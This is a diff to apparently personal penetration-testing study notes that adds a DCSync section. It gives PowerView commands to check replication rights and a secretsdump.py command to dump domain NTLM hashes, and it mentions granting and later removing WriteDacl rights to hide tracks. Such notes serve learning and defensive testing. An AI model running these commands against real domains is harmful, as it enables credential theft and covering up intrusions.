@@ -96,6 +96,32 @@ Set-DomainObject -Credential $Cred -Identity [target_user] -SET @{serviceprincip
 Set-DomainObject -Credential $Cred -Identity [target_user] -Clear serviceprinciplename -Verbose
 ```
 
+## DCSync
+DCSync is a technique for stealing an AD password database using the built-in *Directory Replication Service Remote Protocol*. This protocol allows DCs to replicate domain data. This attack could allow us to mimic a DC and retrieve user NTLM password hashes.
+
+The core component of this attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right (*a right that allows the replication of secret data*). If we have control of an account with `Replicating Directory Changes` and `Replicating Directory Changes All` permissions, we can perform this attack.
+
+### Check a user for the permissions required
+> Using PowerView
+```PowerShell
+Get-DomainUser -Identity [user] | select samaccountname,objectsid,memberof | fl
+```
+This will give us the `DC` identifier that we need eg. `DC=INLANEFREIGHT,DC=LOCAL` and it will also give us the user's `SID`.
+```PowerShell
+$sid = "[user_sid]"
+Get-ObjectAcl "[DC_identifier]" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+```
+This will then show us all the replication permissions for that user. We are looking for `DS-Replication-Get-Changes-All`.
+
+> If we had certain other rights such as: [WriteDacl](https://bloodhound.specterops.io/resources/edges/write-dacl) then we could add this to our users and remove it to hide our tracks later.
+
+### Using secretsdump.py
+```bash
+secretsdump.py -outputfile hashes -just-dc [domain]/[user]@[dc-ip]
+```
+> `-just-dc-ntlm` will give us only ntlm hashes, as opposed to also giving kerberos keys too
+> ``
+
 ## Remediation and Detection
 ### Regular auditing for dangerous ACLs
 - Regularly check for dangerous ACL configurations and remove them
